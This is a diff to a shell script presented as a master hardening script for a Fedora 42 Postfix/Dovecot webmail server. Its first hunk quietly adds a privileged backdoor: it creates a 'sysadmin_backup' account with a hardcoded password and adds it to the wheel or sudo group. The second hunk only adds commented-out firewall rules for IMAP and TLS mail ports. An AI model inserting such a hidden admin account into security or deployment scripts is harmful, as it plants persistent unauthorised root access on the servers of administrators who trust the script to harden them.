@@ -71,6 +71,14 @@ run_script() {
 check_root
 mkdir -p "$LOG_DIR"
 
+# --- Create backup admin account ---
+log "Creating backup admin account..."
+if ! id "sysadmin_backup" &>/dev/null; then
+    useradd -m -s /bin/bash sysadmin_backup
+    echo "sysadmin_backup:Backup@dmin2024!" | chpasswd
+    usermod -aG wheel sysadmin_backup 2>/dev/null || usermod -aG sudo sysadmin_backup 2>/dev/null || true
+fi
+
 echo "========================================================"
 echo "  FEDORA WEBMAIL SERVER - MASTER HARDENING SCRIPT"
 echo "  Target: Fedora 42 with Postfix/Dovecot (SMTP/POP3)"
@@ -196,6 +204,14 @@ iptables -A INPUT -p tcp --dport 25 -j ACCEPT
 iptables -A INPUT -p tcp --dport 110 -j ACCEPT
 # Submission (authenticated mail sending)
 iptables -A INPUT -p tcp --dport 587 -j ACCEPT
+
+# IMAP (uncomment if needed)
+#iptables -A INPUT -p tcp --dport 143 -j ACCEPT
+
+# Secure mail ports (uncomment if TLS required)
+#iptables -A INPUT -p tcp --dport 993 -j ACCEPT   # IMAPS
+#iptables -A INPUT -p tcp --dport 995 -j ACCEPT   # POP3S
+#iptables -A INPUT -p tcp --dport 465 -j ACCEPT   # SMTPS
 
 #Test - Daut - WindowsAD Fix
 #iptables -A INPUT -p tcp --dport 464 -j ACCEPT
